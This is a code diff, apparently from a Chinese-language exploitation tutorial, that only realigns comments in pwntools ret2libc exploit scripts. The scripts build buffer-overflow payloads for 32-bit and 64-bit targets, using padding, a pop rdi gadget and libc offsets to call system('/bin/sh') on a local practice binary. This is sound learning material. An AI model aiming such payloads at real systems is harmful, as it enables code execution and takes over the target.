@@ -116,10 +116,10 @@ libc_addr = 0xf7c00000
 system_addr = libc_addr + 0x4f610
 shell_addr = libc_addr + 0x1c4dcd
 
-payload = b'A' * 76             # Padding 到 EIP
-payload += p32(system_addr)     # system() 的地址
-payload += p32(0x0)             # 避免异常
-payload += p32(shell_addr)      # /bin/sh 的地址
+payload = b'A' * 76          # Padding 到 EIP
+payload += p32(system_addr)  # system() 的地址
+payload += p32(0x0)          # 避免异常
+payload += p32(shell_addr)   # /bin/sh 的地址
 
 p.sendline(payload)
 
@@ -156,12 +156,12 @@ shell_addr = libc_addr + 0x19fe34
 
 POP_RDI, POP_RSI_R15 = 0x4011cb, 0x4011c9
 
-payload = b'A' * 72             # Padding 到 RIP
-payload += p64(POP_RDI)         # pop rdi ; ret
-payload += p64(shell_addr)      # 传入 /bin/sh 的地址
-payload += p64(POP_RSI_R15)     # pop rsi ; pop r15 ; ret
-payload += p64(0x0) * 2         # 填充 rsi 和 r15
-payload += p64(system_addr)     # 把 system() 的地址传入 RIP
+payload = b'A' * 72          # Padding 到 RIP
+payload += p64(POP_RDI)      # pop rdi ; ret
+payload += p64(shell_addr)   # 传入 /bin/sh 的地址
+payload += p64(POP_RSI_R15)  # pop rsi ; pop r15 ; ret
+payload += p64(0x0) * 2      # 填充 rsi 和 r15
+payload += p64(system_addr)  # 把 system() 的地址传入 RIP
 
 p.sendline(payload)
 
@@ -181,16 +181,16 @@ context(os='linux', arch='amd64', log_level='info')
 elf = context.binary = ELF('./vuln-32')
 p = process()
 
-libc = elf.libc                                 # 获取程序正在使用的 libc
-libc.address = 0xf7c00000                       # 设置 libc 地址
+libc = elf.libc                             # 获取程序正在使用的 libc
+libc.address = 0xf7c00000                   # 设置 libc 地址
 
-system_addr = libc.sym['system']                # 获取 system() 的地址
-shell_addr = next(libc.search(b'/bin/sh'))      # 获取 /bin/sh 的地址
+system_addr = libc.sym['system']            # 获取 system() 的地址
+shell_addr = next(libc.search(b'/bin/sh'))  # 获取 /bin/sh 的地址
 
-payload = b'A' * 76                             # Padding 到 EIP
-payload += p32(system_addr)                     # system() 的地址
-payload += p32(0x0)                             # 避免异常
-payload += p32(shell_addr)                      # /bin/sh 的地址
+payload = b'A' * 76                         # Padding 到 EIP
+payload += p32(system_addr)                 # system() 的地址
+payload += p32(0x0)                         # 避免异常
+payload += p32(shell_addr)                  # /bin/sh 的地址
 
 p.sendline(payload)
 
